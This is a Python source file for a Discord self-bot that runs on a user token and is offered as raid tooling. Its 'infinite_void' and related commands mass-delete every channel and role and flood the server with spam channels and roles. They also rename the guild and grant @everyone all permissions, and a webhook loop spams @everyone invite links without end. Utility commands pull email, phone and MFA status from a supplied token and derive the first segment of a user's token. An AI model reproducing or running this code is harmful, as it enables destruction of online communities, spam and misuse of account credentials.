import discord
import os
import json
import requests
from discord.ext import commands
from aiohttp import ClientSession
from colorama import Fore
from tasksio import TaskPool
import random
import base64
import urllib.parse
import urllib.request
import animec
import re

os.system("title Honoured Self Bot")

with open("config.json") as a:
    config = json.load(a)

token = config["token"]
prefix = config["prefix"]

gojo = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None, self_bot=True)

headers = {
    "Authorization": token,
    'Content-Type': 'application/json'
}
embed_handle = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||"
COLOR = "#800080"
IMAGE = "https://media.discordapp.net/attachments/1170463640764293140/1199014500255408260/228136787949a85c103a630c753726aa.gif?ex=662683c5&is=66140ec5&hm=84dfcf69ca908ff14eedfee23706d4cd939a0a8b25d26a12e3c2293646c47816&"
author = "Honoured 🫸🏻🔴🔵🫷🏻🤌🏻🫴🏻⏤͟͟͞🟣 Self Bot"
nuke = False

spam_channel = config["spam_channel_name"]
spam_message = config["spam_role_name"]

async def delete_channels(channel_id):
    async with ClientSession(headers=headers) as cs:
        await cs.delete(f"https://discord.com/api/v9/channels/{channel_id}")

async def create_channels(guild_id):
    payload = {
        "name": random.choice(spam_channel),
        "type": 0
    }
    async with ClientSession(headers=headers) as cs:
        await cs.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json=payload)

async def delete_roles(guild_id, role_id):
    async with ClientSession(headers=headers) as cs:
        await cs.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}")

async def create_roles(guild_id):
    payload = {
        "name": random.choice(spam_channel)
    }
    async with ClientSession(headers=headers) as cs:
        await cs.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", json=payload)

@gojo.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.message.delete()
        await ctx.send("```Something is missing after the Command!```")
    if isinstance(error, commands.MissingPermissions):
        await ctx.message.delete()
        await ctx.send("```Missing Permissions to run this Command!```")
    if isinstance(error, commands.CommandNotFound):
      await ctx.message.delete()
      await ctx.send("```Wrong Command!```")
      return
    raise error

@gojo.command()
async def infinite_void(ctx):
    await ctx.message.delete()

    async with TaskPool(1_000) as pool:
        for c in ctx.guild.channels:
            await pool.put(delete_channels(c.id))

    async with TaskPool(1_000) as pool:
        for i in range(150):
            await pool.put(create_channels(ctx.guild.id))

    async with TaskPool(1_000) as pool:
        for r in ctx.guild.roles:
            await pool.put(delete_roles(ctx.guild.id, r.id))
    
    async with TaskPool(1_000) as pool:
        for i in range(100):
            await pool.put(create_roles(ctx.guild.id))

    await ctx.guild.edit(name="Sakai Solos")

    role = discord.utils.get(ctx.guild.roles, name="@everyone")
    await role.edit(permissions=discord.Permissions.all())

@gojo.command()
async def ccr(ctx, amount:int):
    await ctx.message.delete()
    async with TaskPool(1_000) as pool:
        for i in range(amount):
            await pool.put(create_channels(ctx.guild.id))

@gojo.command()
async def cdel(ctx):
    await ctx.message.delete()
    async with TaskPool(1_000) as pool:
        for c in ctx.guild.channels:
            await pool.put(delete_channels(c.id))

@gojo.command()            
async def rcr(ctx, amount:int):
    await ctx.message.delete()
    async with TaskPool(1_000) as pool:
        for i in range(amount):
            await pool.put(create_roles(ctx.guild.id))

@gojo.command()
async def rdel(ctx):
    await ctx.message.delete()
    async with TaskPool(1_000) as pool:
        for role in ctx.guild.roles:
            await pool.put(delete_roles(ctx.guild.id, role.id))

@gojo.event
async def on_guild_channel_create(channel):
    global nuke
    nuke = True
    embed = discord.Embed(title="Raided lol 🗣️",description="Nuked",color=0x800080)
    embed.set_image(url=IMAGE)
    webhook = await channel.create_webhook(name="The Honoured One")
    while nuke:
        await webhook.send("@everyone https://discord.gg/THwHahTDaz",embed=embed)

@gojo.command()
async def stop(ctx):
    await ctx.message.delete()
    global nuke
    nuke = False

@gojo.command()
async def stream(ctx,*,name):
    await ctx.message.delete()
    await gojo.change_presence(activity=discord.Streaming(name=name, url="https://www.twitch.tv/#"))

@gojo.command()
async def play(ctx, *, name):
    await ctx.message.delete()
    await gojo.change_presence(activity=discord.Game(name=name))

@gojo.command()
async def listen(ctx, *, name):
    await ctx.message.delete()
    await gojo.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening), name=name))

@gojo.command()
async def watching(ctx, *, name):
    await ctx.message.delete()
    await gojo.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching), name=name))

@gojo.command()
async def tokeninfo(ctx, token2):
    await ctx.message.delete()
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token2}).json()
    username = r["username"]
    user_id = r["id"]
    locale = r["locale"]
    email = r["email"]
    phone = r["phone"]
    mfa = r["mfa_enabled"]
    await ctx.send(f"""```
{username} info:

ID: {user_id}
Locale: {locale}
Email: {email}
Phone: {phone}    
MFA: {mfa}   
```""")
    
@gojo.command()
async def purge(ctx, amount:int):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount)

@gojo.command()
async def rename(ctx,*,name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)

@gojo.command()
async def userinfo(ctx, id):
    await ctx.message.delete()
    base_url = f"https://discord.com/api/v9/users/{id}"
    response = requests.get(base_url, headers=headers)
    user_data = response.json()
    user = await gojo.fetch_user(id)
    first_part = base64.b64encode(str(user.id).encode('utf-8')).decode('utf-8').rstrip('=')
    date_format = "%a, %d %b %Y %I:%M %p"
    hypesquad_class = str(user.public_flags.all()).replace('[<UserFlags.', '').replace('>]', '').replace('_',
                                                                                                         ' ').replace(
        ':', '').title()
    hypesquad_class = ''.join([i for i in hypesquad_class if not i.isdigit()])
    user_profile = await user.profile()
    is_premium = user_profile.premium
    avatar_urll = f"https://cdn.discordapp.com/avatars/{id}/{user_data['avatar']}"

    info = f"""
First Piece of Token: {first_part}
Account Created {user.created_at.strftime(date_format)}
HypeSquad: {hypesquad_class}
Nitro: {is_premium}
"""
    url = make_embed(f"{user.name} info", info, avatar_urll)
    await ctx.send(url)

@gojo.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    date_format = "%a, %d %b %Y %I:%M %p"
    icon_url = f"https://cdn.discordapp.com/icons/{ctx.guild.id}/{ctx.guild.icon}.webp"
    await ctx.send(f"""```
{ctx.guild.name} Info:

Server ID: {ctx.guild.id}
Created On: {ctx.guild.created_at.strftime(date_format)}
Owner: {ctx.guild.owner}
Members: {ctx.guild.member_count} Members
Channels: {len(ctx.guild.text_channels)} Text | {len(ctx.guild.voice_channels)} Voice
Roles: {len(ctx.guild.roles)} Roles
Emojis: {len(ctx.guild.emojis)} Emojis
Region: {ctx.guild.region}```
{icon_url}   
""")
    
@gojo.command()
async def ipinfo(ctx, ip):
    await ctx.message.delete()
    r = requests.get(f"http://ip-api.com/json/{ip}").json()
    country = r["country"]
    region = r["regionName"]
    city = r["city"]
    zip = r["zip"]
    isp = r["isp"]
    As = r["as"]
    org = r["org"]
    
    content = f"""
country: {country}
region: {region}
city: {city}
zip: {zip}
isp: {isp}
as: {As}
org: {org}
"""
    url = make_embed(f"{ip} info",content,image=None)
    await ctx.send(url)

@gojo.command()
async def strongests(ctx):
    await ctx.message.delete()
    file_path = r"C:\Users\david\Downloads\Snaptik.app_7311011379878579499.mp4"
    if os.path.exists(file_path):
        await ctx.send(file=discord.File(file_path))

@gojo.command()
async def yowaimo(ctx):
    await ctx.message.delete()
    file_path = r"C:\Users\david\Downloads\Snaptik.app_7263804833226853650.mp4"
    if os.path.exists(file_path):
        await ctx.send("# YOWAIMO",file=discord.File(file_path))

@gojo.command()
async def daddyraga(ctx):
    await ctx.message.delete()
    file_path = r"C:\Users\david\Downloads\Snaptik.app_7325587603166694687.mp4"
    if os.path.exists(file_path):
        await ctx.send("# DADDYRAGA HELP!",file=discord.File(file_path))

@gojo.command()
async def go__jo(ctx):
    await ctx.message.delete()
    await ctx.send("https://tenor.com/view/gojo-gojo-satoru-satoru-gojo-jujutsu-kaisen-sukuna-gif-7290568355006713477")

@gojo.command()
async def hollowpurple(ctx):
    await ctx.message.delete()
    file_path = r"C:\Users\david\Downloads\Snaptik.app_7260956354788019462.mp4"
    if os.path.exists(file_path):
        await ctx.send(file=discord.File(file_path))

@gojo.command()
async def allah(ctx):
    await ctx.message.delete()
    file_path = r"C:\Users\david\Downloads\Snaptik.app_7260956354788019462.mp4"
    if os.path.exists(file_path):
        await ctx.send("# ALLAAAAAH",file=discord.File(file_path))

def make_embed(title, content, image=None):
    parsedcontent = urllib.parse.quote(content)
    parsedtitle = urllib.parse.quote(title)
    parsedauthor = urllib.parse.quote(author)
    parsedcolor = urllib.parse.quote(COLOR)
    url = f"{embed_handle}https://embedl.ink/?deg&provider=&providerurl=&author={parsedauthor}&title={parsedtitle}&color={parsedcolor}&media=large&mediaurl={image}&desc={parsedcontent}"
    return url

@gojo.command()
async def help(ctx):
    await ctx.message.delete()
    content = f"""
{prefix}raid - Raid Commands
{prefix}utilities - Utility Commands
{prefix}fun - Fun Commands
{prefix}jjk - jjk Commands
"""
    url = make_embed("Help",content,IMAGE)
    await ctx.send(url)

@gojo.command()
async def raid(ctx):
    await ctx.message.delete()
    content = f"""
{prefix}infinite_void - Destroy Server
{prefix}ccr [amount] - Create Channels
{prefix}cdel - Delete Channels
{prefix}rcr [amount] - Create Roles
{prefix}rdel - Delete Roles
{prefix}rename [name] - Rename Guild
{prefix}stop - Stop Nuking
"""
    url = make_embed("Raid cmds",content,IMAGE)
    await ctx.send(url)

@gojo.command()
async def utilities(ctx):
    await ctx.message.delete()
    content = f"""
{prefix}userinfo [id] - Get info on a user
{prefix}serverinfo - Get server info 
{prefix}tokeninfo [token] - Get info on a token
{prefix}ipinfo [IP] - Get info on a IP
{prefix}purge [amount] - Purge channel Messages
{prefix}stream/play/listen/watch - Change your Status
"""
    url = make_embed("Utility cmds",content,IMAGE)
    await ctx.send(url)

@gojo.command()
async def fun(ctx):
    await ctx.message.delete()
    content = f"""
{prefix}meme - Send a random meme
{prefix}allah - ALLAAAAAH
{prefix}kiss [user] - Kiss somebody
{prefix}hug [user] - Hug somebody
{prefix}slap [user] - Slap somebody
{prefix}waifu - Random waifu 🔞
"""
    url = make_embed("Fun cmds",content,IMAGE)
    await ctx.send(url)

@gojo.command()
async def jjk(ctx):
    await ctx.message.delete()
    content = f"""
{prefix}strongests - Battle of the strongests Edit
{prefix}yowaimo - Gojo edit
{prefix}daddyraga - DADDYRAGAAA!!!
{prefix}go__jo - Rip bozo
{prefix}hollowpurple - hp edit
"""
    url = make_embed("Jjk cmds",content,IMAGE)
    await ctx.send(url)

@gojo.command()
async def meme(ctx):
    await ctx.message.delete()
    async with ClientSession() as cs:
        async with cs.get("https://www.reddit.com/r/memes.json") as r:
            memes = await r.json()
            urll=memes['data']['children'][random.randint(0,25)]['data']['url']
    urlll = make_embed("Random Meme","", urll)
    await ctx.send(urlll)

@gojo.command()
async def kiss(ctx, user:discord.User):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    url = res["url"]
    urll = make_embed("Kiss 💋",f"@{user.name}", url)
    await ctx.send(urll)

@gojo.command()
async def hug(ctx, user:discord.User):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    url = res["url"]
    urll = make_embed("Hug 🫂",f"@{user.name}", url)
    await ctx.send(urll)

@gojo.command()
async def slap(ctx, user:discord.User):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    url = res["url"]
    urll = make_embed("Slap 👋",f"@{user.name}",url)
    await ctx.send(urll)

@gojo.command()
async def waifu(ctx):
    await ctx.message.delete()
    response = requests.get('https://api.waifu.pics/nsfw/waifu')
    data = response.json()
    if 'url' in data:
        image_url = data['url']
        url = make_embed("🔞", "waifu", image_url)
        await ctx.send(url)

@gojo.command()
async def anime(ctx,*,query):
    await ctx.message.delete()
    try:
        anime = animec.Anime(query)
    except:
        await ctx.send("No Corresponding Anime is Found!")
    
    content = f"""
{anime.description}

Episodes: {str(anime.episodes)}
Rating: {str(anime.rating)}
Broadcast: {str(anime.broadcast)}
Status: {str(anime.status)}
Type: {str(anime.type)}
NSFW Status: {str(anime.is_nsfw())}
"""
    url = make_embed(anime.title_english,content,anime.poster)
    await ctx.send(url)

@gojo.event
async def on_ready():
    os.system("cls")
    print(Fore.MAGENTA + """                                    

                ⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⣾⡳⣼⣆⠀⠀⢹⡄⠹⣷⣄⢠⠇⠻⣷⣶⢀⣸⣿⡾⡏⠐⠰⣿⣰⠏⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣀⣀⣀⡹⣟⡪⢟⣷⠦⠬⣿⣦⣌⡙⠿⡆⠻⡌⠿⣦⣿⣿⣿⣿⣶⣿⣿⡿⠾⣙⠄⡉⢳⣔⡀⠀⠀⠁⠀
                ⠀⠀⠀⠀⠀⠀⠀⡀⢀⣼⣟⠛⠛⠙⠛⠉⠻⢶⣮⢿⣯⡙⢶⡌⠲⢤⡑⠀⠈⠛⠟⢿⣿⠛⣿⢟⣏⣃⣵⢯⣧⣽⣕⡟⡐⡿⣆⠀⠀⠀
                ⠀⠀⠀⠀⠀⡸⠯⣙⠛⢉⣉⣙⣿⣿⡳⢶⣦⣝⢿⣆⠉⠻⣄⠈⢆⢵⡈⠀⠀⢰⡆⠀⣼⣳⠼⡱⣯⣯⣷⢛⣷⣟⡵⣟⣯⡞⣧⡀⠈⣷
                ⠀⠀⠀⠖⠉⠻⣟⡿⣿⣭⢽⣽⣶⣈⢛⣾⣿⣧⠀⠙⠓⠀⠑⢦⡀⠹⣧⢂⠀⣿⡇⢀⣿⠻⢏⣿⢟⣟⣿⣹⣾⡏⣖⡩⢿⣗⢡⡂⠀⠀
                ⠀⠀⠀⠀⠐⠈⠉⢛⣿⣿⣶⣤⣈⠉⣰⣗⡈⢛⣇⠀⣵⡀⠀⠘⣿⡄⢻⣤⠀⢻⡇⣼⣧⣿⠁⢨⣜⢿⣱⡻⣵⣅⣫⢼⢿⣿⠽⡏⡀⠀
                ⠀⠀⠀⠀⠀⣠⣾⣿⢍⡉⠛⠻⣷⡆⠨⣿⣭⣤⣍⠀⢹⣷⡀⠀⠹⣿⡄⠈⠀⢿⠁⣿⣿⢏⢂⠐⣷⡷⢿⣼⣾⣗⣭⢭⣿⣿⡕⠏⣇⠀
                ⠀⣿⣇⣠⣾⣿⣛⣲⣿⠛⠀⠀⢀⣸⣿⣿⣟⣮⡻⣷⣤⡙⢟⡀⠀⠙⢧⠀⠀⠎⠀⠉⠁⠰⣿⠉⡽⣟⢿⣻⠽⣯⡷⣭⣟⣏⣿⢾⡿⠀
                ⠀⠈⢻⣿⣿⣽⣿⣿⣿⣴⡏⠚⢛⣈⣍⠛⠛⠿⢦⣌⢙⠻⡆⠁⠀⠀⠀⣴⣦⠀⠀⠀⠐⢳⢻⣧⣥⡹⢫⢟⣗⣿⣿⣧⣯⣟⠾⠋⠀⠀
                ⠀⠀⠈⠙⣿⣧⣶⣿⠿⣧⣴⣿⢻⡉⠀⢀⣠⣴⣾⡟⠿⠃⠁⣠⣤⡶⣾⡟⠅⠀⣀⡄⠀⣾⢸⣿⣿⢻⣾⣿⣯⣿⣿⣿⣿⣿⣡⣤⡄⠀
                ⠀⠀⣠⣞⣋⣿⣿⣾⣿⡿⡛⣿⡟⣤⢰⡿⠟⠉⣀⣀⣤⣤⡠⠙⢁⣾⡿⠂⠀⣿⠟⣁⠀⣹⠀⣹⣿⡟⣼⣿⣿⣿⣿⣟⣿⣿⠁⠀⠀⠀
                ⠀⢠⡿⢛⢟⣿⣿⣿⣿⣿⣿⡟⣼⣿⣟⢓⠛⣿⣏⣿⣵⣗⣵⣴⣿⢟⡵⣣⣼⣿⢟⣵⣶⢻⣶⣿⠀⠀⣈⢻⣿⣿⣿⢿⣾⢿⣧⠀⠀⠀
                ⠀⠘⠃⢸⣿⡾⣿⣿⣿⣿⣯⣿⣿⣿⣾⣿⣿⣟⣾⡿⣫⣿⣿⣿⣽⣿⣿⣿⣿⢫⣾⣿⣿⣿⣿⣿⣴⡎⣻⣿⡏⣿⢿⣧⣿⡿⣿⡆⠀⠀
                ⠀⠀⠀⠜⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣖⣿⢿⣿⡿⣿⣿⣿⡿⢡⢯⣿⣿⣿⣿⣿⣿⣿⣧⡿⣾⣷⣿⣿⣿⣿⡇⠉⠁⠀⠀
                ⠀⠀⠀⠀⣿⣥⣾⣿⣿⣿⣿⣿⣿⣿⡇⣭⣿⣿⣿⣿⠃⠞⠟⣸⣿⠏⣸⣧⣀⠿⢿⣿⣿⣟⣿⣿⣿⣿⣽⣿⢿⣿⣿⣿⣿⠁⠀⠀⠀⠀
                ⠀⠀⠀⠈⠛⣹⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣟⣿⣿⡿⢶⣦⣄⣿⠏⠀⣿⣟⣿⣶⠾⣿⣟⣋⣛⣿⣿⣿⣿⡇⣻⣿⣿⣿⡏⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠟⠛⠫⣿⣿⣿⣿⣿⡿⣧⠛⣿⠻⣿⣿⣿⣷⡌⠹⡟⠀⠀⠉⡟⠋⢠⣾⣿⣿⣿⡟⣿⣿⣿⣿⢀⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠘⠋⣾⣷⣿⣿⣧⠙⠀⠙⢣⠝⠛⠋⣽⣷⢦⠇⠀⠀⠘⠁⣤⣾⣿⠝⠛⠉⠘⢻⣿⣿⢿⣼⣷⡟⢻⣷⠉⠀⡀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠐⠟⢻⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠛⠀⠀⠀⠀⠀⣾⠟⠀⢸⣷⣿⡇⠀⠛⠀⠀⠁⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠁⠀⢹⣇⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢻⡿⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠲⣄⠀⡄⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠈⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⣀⠀⠀⣠⣾⣿⠁⠀⠀⠀⠀⠀⣀⡄⡀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠘⠀⠀⠈⠀⠀⠀⠀⠀⠀⣿⣿⢻⣆⠀⠛⠁⠶⣶⣶⣶⣶⣶⣶⡶⠆⠘⠋⣠⡾⢫⣾⡟⠀⠀⠀⠀⠀⠐⠉⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⡄⠀⠀⠂⠀⠀⠀⠀⠀⣿⠛⠀⠙⣷⡀⠀⠀⠙⠛⠛⠛⠛⠋⠁⠀⢀⣴⠋⠀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⢀⣤⣿⣰⣦⡀⠸⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠁⠀⠐⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⡄⢺⣿⡄⠹⣿⠻⢦⣤⣤⣤⣤⣶⣿⡟⢀⣀⠀⠀⢸⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀
                ⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣮⣿⣿⡀⠹⡷⣦⣀⡀⡀⢸⣿⠏⢠⣾⣿⠀⠀⣾⣿⣿⣿⣿⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀
                ⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠘⣷⣻⡟⠀⡼⠁⣴⣿⣿⣯⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀
                ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣿⣤⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄
                ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿


""" + Fore.RESET)
    print(Fore.LIGHTMAGENTA_EX + "\n[+]Self Bot Successfully Connected!" + Fore.RESET)
    print(Fore.LIGHTMAGENTA_EX + f"\n[+]Connected to: {gojo.user}\n[+]User ID: {gojo.user.id}" + Fore.RESET)
    print(Fore.LIGHTMAGENTA_EX + f"[+]Type {prefix}help to view Commands" + Fore.RESET)




gojo.run(token, bot=False)
